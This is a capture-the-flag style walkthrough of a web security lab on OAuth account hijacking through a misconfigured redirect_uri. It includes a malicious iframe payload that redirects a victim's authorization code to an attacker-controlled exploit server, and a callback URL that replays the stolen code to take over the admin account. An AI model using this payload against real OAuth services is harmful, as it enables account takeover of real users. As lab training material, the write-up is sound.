# OAuth account hijacking via redirect_uri
* This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.
* To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete Carlos.
	* The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.
	* You can log in with your own social media account using the following credentials: `wiener: peter`

### 1. Enumerate the web page
* When click "My account", the page is redirected to a social media login page.

![14](https://user-images.githubusercontent.com/53956303/156851721-6108ab6f-78ae-4745-8f1b-e0a1877e231e.png)
* Login as "wiener:peter".
	* The page returns a authorization page.

![15](https://user-images.githubusercontent.com/53956303/156851801-8d0d8130-84f5-412a-9393-b68cef3729af.png)
* when click "Continue", successfully logged in with the social media account.

![16](https://user-images.githubusercontent.com/53956303/156851907-2bdab32b-cd9f-4254-bfc8-48797b62b0ec.png)
### 2. Enumerate the web page using Burp suite HTTP history
* From the HTTP history, a request `/auth` contains some OAuth components are  found.

![17](https://user-images.githubusercontent.com/53956303/156852155-e402dbf3-5081-4144-aebf-f1b850f184fb.png)
### 3. Try to modify the `redirect_uri` parameter
* send the request to repeater to modify.
	* Put arbitrary uri for `redirect_uri`. In this case, use `test.com`

![18](https://user-images.githubusercontent.com/53956303/156852337-794f287c-b21a-452a-b7bd-60c2f7e104e4.png)
* It returns no error. the `redirect_uri` might be able to point the exploit server to obtain an authorization code.
### 4. Create a malicious iframe to obtain an authorization code
* When enumerate the original `redirect_uri` value, the `/oauth-callback` is called ,and supply authentication code to it.
	* By use the exploit, the admin will supply the admin authentication code to the exploit server. As a result, an attacker can obtain the authentication code via accessing the "Access log".

![19](https://user-images.githubusercontent.com/53956303/156852614-58a9eef3-8f74-4bb0-8b3d-0bdd8d974c01.png)
* Create a malicious HTML contains this iframe.
```iframe
<iframe src="https://oauth-acee1f541eb608d4c0bf34cf02710063.web-security-academy.net/auth?client_id=fcqiecm721ddurqu1acs9&redirect_uri=https://exploit-acd11f391e61080ec02034c1014d006e.web-security-academy.net&response_type=code&scope=openid%20profile%20email"></iframe>
```
![20](https://user-images.githubusercontent.com/53956303/156853051-e83ccf10-55c5-4de6-88a1-0d99b5762639.png)

* Store the exploit and "View exploit". Then, use "Access log" to see if the exploit works well.

![21](https://user-images.githubusercontent.com/53956303/156853182-8b87db9a-6197-4541-91c7-eccadb723c48.png)
* From the result, the code is made successfully.
	* Now, send the exploit to admin to get the admin's code.

![22](https://user-images.githubusercontent.com/53956303/156853315-b04e8fcc-6623-4803-982a-ec4091ff3cf9.png)
* From the result, admin code is given.
### 5. login as admin
* Log out and navigate to
```http
https://acea1fce1e0308c6c04634e6000f003c.web-security-academy.net/oauth-callback?code=N1EJkwzBjTTZW3zVZoXbudZzg6bCZSnfV2_ED86V1lI
```
* As a result, log in as Admin is granted.

![23](https://user-images.githubusercontent.com/53956303/156853508-04e45a78-acc6-45af-a0b0-9c119c2c2667.png)
* By deleting the Carlos account, the lab is solved.

![24](https://user-images.githubusercontent.com/53956303/156853591-5824e5aa-a469-4adb-afeb-5c9847f1dd3a.png)
